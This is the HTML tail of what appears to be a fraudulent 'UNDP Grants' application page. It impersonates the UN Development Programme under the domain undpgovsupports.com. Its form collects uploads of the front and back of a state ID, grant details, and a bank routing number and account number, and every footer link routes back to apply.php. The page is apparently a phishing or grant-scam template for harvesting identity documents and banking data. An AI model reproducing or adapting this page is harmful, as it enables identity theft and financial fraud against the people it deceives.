																						for="idfront">Front of your
																						State ID/License<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="file" name="front"
																						id="idfront"
																						accept="image/jpg,image/png,image/jpeg,image/gif/application/pdf"
																						onchange="showDiv('fpdiv', this); document.getElementById('fpreview').src = window.URL.createObjectURL(this.files[0])">
																					<br>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group id_err"
																					id="id_b">
																					<label class="label"
																						for="idback">Back of your State
																						ID/License<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="file" name="back"
																						id="idback"
																						accept="image/jpg,image/png,image/jpeg,image/gif/application/pdf"
																						onchange="showDiv('bpdiv', this); document.getElementById('bpreview').src = window.URL.createObjectURL(this.files[0])">
																					<br>
																				</div>
																			</div>
																		</div>
																		
																		<div class="separator">Grant Payment Information
																		</div><br>
																		<div class="row row-space">
																			<div class="col-2">
																				<div class="input-group"
																					id="b_granterr">
																					<label class="label">Grant Type<span
																							style="color: red">*</span></label>
																					<div class="rs-select2 js-select-simple select--no-search"
																						id="b_grant_div">
																						<select name="b_grant"
																							id="b_grant">
																							<option value=""
																								selected="selected"
																								my_order_property="first">
																								Select Grant Type
																							</option>
																							<option
																								value="Educational Grant">
																								Educational Grant
																							</option>
																							<option
																								value="Personal Grant">
																								Personal Grant</option>
																							<option
																								value="Business Grant">
																								Business Grant</option>
																							<option
																								value="Healthcare Grant">
																								Healthcare Grant
																							</option>
																							<option
																								value="Home Development Grant">
																								Home Development Grant
																							</option>
																						</select>
																						<div class="select-dropdown">
																						</div>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group">
																					<label class="label"
																						for="b_gamt">Grant Amount<span
																							style="color: red">*</span></label>
																					<input class="input--style-4"
																						type="text" name="b_gamt" required="required"
																						id="b_gamt" disabled>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space">
																			<div class="col-2">
																				<div class="input-group">
																					<label class="label">&ensp;How to
																						receive the grant<span
																							style="color: red">*</span></label>
																					<div class="radio-toolbar">
																						<input type="radio"
																							checked="checked"
																							id="cdeposit" name="b_gpay"
																							value="Direct Deposit" required>
																						<label for="cdeposit">Direct
																							Deposit</label>
																						<input type="radio"
																							id="cdeposit2" name="b_gpay"
																							value="Debit Card">
																						<label for="cdeposit2">Debit
																							Card</label>
																					</div>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group">
																					<label class="label">&ensp;Account
																						Type<span
																							style="color: red">*</span></label>
																					<div class="radio-toolbar">
																						<input type="radio"
																							checked="checked" id="atype"
																							name="b_atype"
																							value="Checking" required>
																						<label
																							for="atype">Checking</label>
																						<input type="radio" id="atype1"
																							name="b_atype"
																							value="Savings">
																						<label
																							for="atype1">Savings</label>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div class="row row-space" id="checking">
																			<div class="col-2">
																				<div class="input-group rt"
																					id="b_rterr">
																					<label class="label"
																						for="b_rt">Routing Number<span
																							style="color: red">*</span><span
																							id="err_msg_b_rt"></span></label>
																					<input class="input--style-4"
																						type="text" name="b_rt"
																						id="b_rt" required>
																				</div>
																			</div>
																			<div class="col-2">
																				<div class="input-group acc"
																					id="b_accerr">
																					<label class="label"
																						for="b_acc">&ensp;Account
																						Number<span
																							style="color: red">*</span><span
																							id="err_msg_b_acc"></span></label>
																					<input class="input--style-4"
																						type="text" name="b_acc"
																						id="b_acc" required>
																				</div>
																			</div>
																		</div>
																		

																		<div class="p-t-15 btn-c">
																			<button class="btn btn--radius-2 btn--green"
																				type="submit" name="mybtn"
																				>Submit Application</a>
																		</div>
																		<span id="status"></span>
																		<br>
																	</form>
																</div>
																<script>
																	function getStatesByCountry() {
																		var countryId = $("#countryId").val();
																		$.post("ajax.php",{getStatesByCountry:'getStatesByCountry',countryId:countryId},function (response) {
																		// alert(response);
																			var data = response.split('^');
																			var stateData = data[1];
																			$("#stateId").html(stateData);
																		});
																	}

																	function getCityByState() {
																		var stateId = $("#stateId").val();
																		$.post("ajax.php",{getCityByState:'getCityByState',stateId:stateId},function (response) {
																			// alert(response);
																			var data = response.split('^');
																			var cityData = data[1];
																			$("#cityDiv").html(cityData);
																		});
																	}
																</script>
															</div>
														</section>
														<section
															class="elementor-section elementor-top-section elementor-element elementor-element-1c100cc elementor-section-boxed elementor-section-height-default elementor-section-height-default"
															data-id="1c100cc" data-element_type="section">
															<div
																class="elementor-container elementor-column-gap-default">
																<div class="elementor-row">
																	<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-9adbcbb"
																		data-id="9adbcbb" data-element_type="column">
																		<div
																			class="elementor-column-wrap elementor-element-populated">
																			<div class="elementor-widget-wrap">
																				<div class="elementor-element elementor-element-00f5f70 elementor-widget elementor-widget-spacer"
																					data-id="00f5f70"
																					data-element_type="widget"
																					data-widget_type="spacer.default">
																					<div
																						class="elementor-widget-container">
																						<div class="elementor-spacer">
																							<div
																								class="elementor-spacer-inner">
																							</div>
																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</section>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-720dc39"
							data-id="720dc39" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<div class="elementor-element elementor-element-3be1480 elementor-widget elementor-widget-gallery"
										data-id="3be1480" data-element_type="widget"
										data-settings="{&quot;columns&quot;:1,&quot;gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:9,&quot;sizes&quot;:[]},&quot;gallery_layout&quot;:&quot;masonry&quot;,&quot;lazyload&quot;:&quot;yes&quot;,&quot;columns_tablet&quot;:2,&quot;columns_mobile&quot;:1,&quot;gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;link_to&quot;:&quot;file&quot;,&quot;overlay_background&quot;:&quot;yes&quot;,&quot;content_hover_animation&quot;:&quot;fade-in&quot;}"
										data-widget_type="gallery.default">
										<div class="elementor-widget-container">
											<div class="elementor-gallery__container e-gallery-container e-gallery-masonry e-gallery--ltr e-gallery--lazyload"
												style="--hgap:9px; --vgap:9px; --animation-duration:350ms; --columns:1; --highest-column-gap-count:4; padding-bottom: 419.827%;">
												<a class="e-gallery-item elementor-gallery-item elementor-animated-content"
													href="img/46958.jpg"
													data-elementor-open-lightbox="yes"
													data-elementor-lightbox-slideshow="all-3be1480"
													data-elementor-lightbox-title="46958ac4-adf8-4f70-8194-d79ffd449b47"
													style="--item-height:150%; --column:0; --items-in-column:0; --percent-height:0%;">
													<div class="e-gallery-image elementor-gallery-item__image e-gallery-image-loaded"
														data-thumbnail="img/46958.jpg"
														data-width="720" data-height="1080" alt=""
														style="background-image: url(&quot;img/46958.jpg&quot;);">
													</div>
													<div class="elementor-gallery-item__overlay"></div>
												</a>
												<a class="e-gallery-item elementor-gallery-item elementor-animated-content"
													href="img/85e4.jpg"
													data-elementor-open-lightbox="yes"
													data-elementor-lightbox-slideshow="all-3be1480"
													data-elementor-lightbox-title="85e97156-ac8c-4c7d-88a3-9f58cda32942"
													style="--item-height:70.0873%; --column:0; --items-in-column:1; --percent-height:35.729%;">
													<div class="e-gallery-image elementor-gallery-item__image e-gallery-image-loaded"
														data-thumbnail="img/85e4.jpg"
														data-width="458" data-height="321" alt=""
														style="background-image: url(&quot;img/85e4.jpg&quot;);">
													</div>
													<div class="elementor-gallery-item__overlay"></div>
												</a>
												<a class="e-gallery-item elementor-gallery-item elementor-animated-content"
													href="img/Image-Fedex.jpg"
													data-elementor-open-lightbox="yes"
													data-elementor-lightbox-slideshow="all-3be1480"
													data-elementor-lightbox-title="WhatsApp Image 2020-11-06 at 23.29.34"
													style="--item-height:66.6667%; --column:0; --items-in-column:2; --percent-height:52.4234%;">
													<div class="e-gallery-image elementor-gallery-item__image e-gallery-image-loaded"
														data-thumbnail="img/Image-Fedex.jpg"
														data-width="1080" data-height="720" alt=""
														style="background-image: url(&quot;img/Image-Fedex.jpg&quot;);">
													</div>
													<div class="elementor-gallery-item__overlay"></div>
												</a>
												<a class="e-gallery-item elementor-gallery-item elementor-animated-content"
													href="img/Image-Fedex2.jpg"
													data-elementor-open-lightbox="yes"
													data-elementor-lightbox-slideshow="all-3be1480"
													data-elementor-lightbox-title="WhatsApp Image 2020-11-06 at 23.29.38"
													style="--item-height:66.6667%; --column:0; --items-in-column:3; --percent-height:68.3029%;">
													<div class="e-gallery-image elementor-gallery-item__image e-gallery-image-loaded"
														data-thumbnail="img/Image-Fedex2.jpg"
														data-width="1080" data-height="720" alt=""
														style="background-image: url(&quot;img/Image-Fedex2.jpg&quot;);">
													</div>
													<div class="elementor-gallery-item__overlay"></div>
												</a>
												<a class="e-gallery-item elementor-gallery-item elementor-animated-content"
													href="img/Image-Fedex3.jpg"
													data-elementor-open-lightbox="yes"
													data-elementor-lightbox-slideshow="all-3be1480"
													data-elementor-lightbox-title="WhatsApp Image 2020-11-06 at 23.29.34 (1)"
													style="--item-height:66.4063%; --column:0; --items-in-column:4; --percent-height:84.1825%;">
													<div class="e-gallery-image elementor-gallery-item__image e-gallery-image-loaded"
														data-thumbnail="img/Image-Fedex3.jpg"
														data-width="1024" data-height="680" alt=""
														style="background-image: url(&quot;img/Image-Fedex3.jpg&quot;);">
													</div>
													<div class="elementor-gallery-item__overlay"></div>
												</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
	</div>
	<div data-elementor-type="footer" data-elementor-id="36" class="elementor elementor-36 elementor-location-footer"
		data-elementor-settings="[]">
		<div class="elementor-section-wrap">
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-5301dab elementor-section-boxed elementor-section-height-default elementor-section-height-default"
				data-id="5301dab" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-606a55a"
							data-id="606a55a" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<section
										class="elementor-section elementor-inner-section elementor-element elementor-element-9f8e37a elementor-section-boxed elementor-section-height-default elementor-section-height-default"
										data-id="9f8e37a" data-element_type="section">
										<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-row">
												<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-f1de6e3"
													data-id="f1de6e3" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-ff057ba elementor-widget elementor-widget-heading"
																data-id="ff057ba" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		Contact</h2>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</section>
								</div>
							</div>
						</div>
						<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2da20cf"
							data-id="2da20cf" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<section
										class="elementor-section elementor-inner-section elementor-element elementor-element-ea19504 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
										data-id="ea19504" data-element_type="section">
										<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-row">
												<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-dd5c33d"
													data-id="dd5c33d" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-faa1de9 elementor-widget elementor-widget-heading"
																data-id="faa1de9" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		Media</h2>
																</div>
															</div>
															<div class="elementor-element elementor-element-5bfaf91 elementor-view-default elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box"
																data-id="5bfaf91" data-element_type="widget"
																data-widget_type="icon-box.default">
																<div class="elementor-widget-container">
																	<div class="elementor-icon-box-wrapper">
																		<div class="elementor-icon-box-icon">
																			<a class="elementor-icon elementor-animation-"
																				href="apply.php"> <i
																					aria-hidden="true"
																					class="far fa-newspaper"></i>
																			</a>
																		</div>
																		<div class="elementor-icon-box-content">
																			<h3 class="elementor-icon-box-title">
																				<a href="apply.php">Write
																					Us</a>
																			</h3>
																			<p class="elementor-icon-box-description">Do
																				you have a question, feedback or a
																				complaint? Let us help you find the
																				right answer. Contact Us</p>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
												<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-68a20f6"
													data-id="68a20f6" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-b6bead1 elementor-widget elementor-widget-heading"
																data-id="b6bead1" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		Report suspicious activities
																	</h2>
																</div>
															</div>
															<div class="elementor-element elementor-element-f553b68 elementor-view-default elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box"
																data-id="f553b68" data-element_type="widget"
																data-widget_type="icon-box.default">
																<div class="elementor-widget-container">
																	<div class="elementor-icon-box-wrapper">
																		<div class="elementor-icon-box-icon">
																			<a class="elementor-icon elementor-animation-"
																				href="apply.php"> <i
																					aria-hidden="true"
																					class="fas fa-user-shield"></i>
																			</a>
																		</div>
																		<div class="elementor-icon-box-content">
																			<h3 class="elementor-icon-box-title">
																				<a
																					href="apply.php">Security</a>
																			</h3>
																			<p class="elementor-icon-box-description">
																				The Internet has revolutionized the way
																				we do business. It allows us to interact
																				with you in a way to offer information
																			</p>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</section>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section
				class="elementor-section elementor-top-section elementor-element elementor-element-bf4b8fe elementor-section-boxed elementor-section-height-default elementor-section-height-default"
				data-id="bf4b8fe" data-element_type="section"
				data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
				<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-row">
						<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-2ed2f84"
							data-id="2ed2f84" data-element_type="column">
							<div class="elementor-column-wrap elementor-element-populated">
								<div class="elementor-widget-wrap">
									<section
										class="elementor-section elementor-inner-section elementor-element elementor-element-8fcf123 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
										data-id="8fcf123" data-element_type="section">
										<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-row">
												<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-6102168"
													data-id="6102168" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-a054faf elementor-align-left elementor-mobile-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list"
																data-id="a054faf" data-element_type="widget"
																data-widget_type="icon-list.default">
																<div class="elementor-widget-container">
																	<ul class="elementor-icon-list-items">
																		<li class="elementor-icon-list-item">
																			<a href="apply.php">
																				<span
																					class="elementor-icon-list-text">UNDP
																					Laws</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php">
																				<span
																					class="elementor-icon-list-text">Privacy</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php"> <span
																					class="elementor-icon-list-text">Links</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php"> <span
																					class="elementor-icon-list-text">Contacts</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php">
																				<span
																					class="elementor-icon-list-text">Terms
																					of Service</span>
																			</a>
																		</li>
																	</ul>
																</div>
															</div>
														</div>
													</div>
												</div>
												<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-b1f662e"
													data-id="b1f662e" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-1dc7124 elementor-align-left elementor-mobile-align-left elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list"
																data-id="1dc7124" data-element_type="widget"
																data-widget_type="icon-list.default">
																<div class="elementor-widget-container">
																	<ul class="elementor-icon-list-items">
																		<li class="elementor-icon-list-item"> <span
																				class="elementor-icon-list-text">Accountability
																				& Reporting</span>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php"> <span
																					class="elementor-icon-list-text">Community
																					Outreach</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php"> <span
																					class="elementor-icon-list-text">Links</span>
																			</a>
																		</li>
																		<li class="elementor-icon-list-item">
																			<a href="apply.php"> <span
																					class="elementor-icon-list-text">Security
																					Statement</span>
																			</a>
																		</li>
																	</ul>
																</div>
															</div>
														</div>
													</div>
												</div>
												<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-fd92dab"
													data-id="fd92dab" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-0d2ac2f elementor-widget elementor-widget-theme-site-logo elementor-widget-image"
																data-id="0d2ac2f" data-element_type="widget"
																data-widget_type="theme-site-logo.default">
																<div class="elementor-widget-container">
																	<div class="elementor-image">
																		<a href="index.php">
																			<img width="640" height="315"
																				src="img/cropped-undp.png"
																				class="attachment-full size-full" alt=""
																				loading="lazy"
																				srcset="img/cropped-undp.png 640w, 300w"
																				sizes="(max-width: 640px) 100vw, 640px" />
																		</a>
																	</div>
																</div>
															</div>
															<div class="elementor-element elementor-element-46312d6 elementor-widget elementor-widget-heading"
																data-id="46312d6" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		Find Us</h2>
																</div>
															</div>
															<div class="elementor-element elementor-element-671a125 elementor-shape-circle e-grid-align-left e-grid-align-mobile-center elementor-grid-0 elementor-widget elementor-widget-social-icons"
																data-id="671a125" data-element_type="widget"
																data-widget_type="social-icons.default">
																<div class="elementor-widget-container">
																	<div
																		class="elementor-social-icons-wrapper elementor-grid">
																		<span class="elementor-grid-item">
																			<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-repeater-item-c9d21fb"
																				target="_blank">
																				<span
																					class="elementor-screen-only">Facebook</span>
																				<i class="fab fa-facebook"></i>
																			</a>
																		</span> <span class="elementor-grid-item">
																			<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-6c53fea"
																				target="_blank">
																				<span
																					class="elementor-screen-only">Twitter</span>
																				<i class="fab fa-twitter"></i>
																			</a>
																		</span> <span class="elementor-grid-item">
																			<a class="elementor-icon elementor-social-icon elementor-social-icon-google-plus elementor-repeater-item-be21323"
																				target="_blank">
																				<span
																					class="elementor-screen-only">Google-plus</span>
																				<i class="fab fa-google-plus"></i>
																			</a>
																		</span>
																	</div>
																</div>
															</div>
															<div class="elementor-element elementor-element-a474a82 elementor-widget elementor-widget-heading"
																data-id="a474a82" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		Contact Us</h2>
																</div>
															</div>
															<div class="elementor-element elementor-element-93f7dee elementor-align-left elementor-mobile-align-center elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list"
																data-id="93f7dee" data-element_type="widget"
																data-widget_type="icon-list.default">
																<div class="elementor-widget-container">
																	<ul class="elementor-icon-list-items">
																		<li class="elementor-icon-list-item"> <span
																				class="elementor-icon-list-icon">
																				<i aria-hidden="true"
																					class="far fa-envelope"></i> </span>
																			<span
																				class="elementor-icon-list-text">info@undpgovsupports.com</span>
																		</li>
																	</ul>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</section>
									<section
										class="elementor-section elementor-inner-section elementor-element elementor-element-65993d5 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
										data-id="65993d5" data-element_type="section">
										<div class="elementor-container elementor-column-gap-default">
											<div class="elementor-row">
												<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-f36d1c3"
													data-id="f36d1c3" data-element_type="column">
													<div class="elementor-column-wrap elementor-element-populated">
														<div class="elementor-widget-wrap">
															<div class="elementor-element elementor-element-b232b24 elementor-widget elementor-widget-heading"
																data-id="b232b24" data-element_type="widget"
																data-widget_type="heading.default">
																<div class="elementor-widget-container">
																	<h2
																		class="elementor-heading-title elementor-size-default">
																		COPYRIGHT © 2022, UNDP GRANTS. ALL RIGHTS RESERVED.
																	</h2>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</section>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
	</div>
	
	<link rel='stylesheet' id='elementor-gallery-css'
		href='css/ab.css' type='text/css'
		media='all' />
	<link rel='stylesheet' id='e-animations-css'
		href='css/beta.css'
		type='text/css' media='all' />
	<script type='text/javascript' src='js/ab.js' id='wp-embed-js'></script>
	<script type='text/javascript' src='js/ac.js' id='jquery-core-js'>
	</script>
	<script type='text/javascript' src='js/ad.js'
		id='jquery-migrate-js'></script>
	<script type='text/javascript'
		src='js/ae.js'
		id='smartmenus-js'></script>
	<script type='text/javascript'
		src='js/af.js'
		id='elementor-gallery-js'></script>
	<script type='text/javascript'
		src='js/ai.js'
		id='elementor-webpack-runtime-js'></script>
	<script type='text/javascript'
		src='js/aj.js'
		id='elementor-frontend-modules-js'></script>
	<script type='text/javascript'
		src='js/ak.js'
		id='elementor-sticky-js'></script>
	<script type='text/javascript'
		src='js/ta.js'
		id='elementor-waypoints-js'></script>
	<script type='text/javascript' src='js/tb.js' id='jquery-ui-core-js'>
	</script>
	<script type='text/javascript' src='js/tc.js'
		id='swiper-js'></script>
	<script type='text/javascript'
		src='js/td.js'
		id='share-link-js'></script>
	<script type='text/javascript' src='js/te.js'
		id='elementor-dialog-js'></script>
	<script type='text/javascript'
		src='js/tf.js'
		id='preloaded-modules-js'></script>
	<!-- Jquery JS-->
	<script src="vendor/jquery/jquery.min.js"></script>
	<!-- Vendor JS-->
	<script src="vendor/select2/select2.min.js"></script>

	<!-- Main JS-->
	<script src="js/global.js"></script>
	<script src="js/ajax.js"></script>
</body>

</html>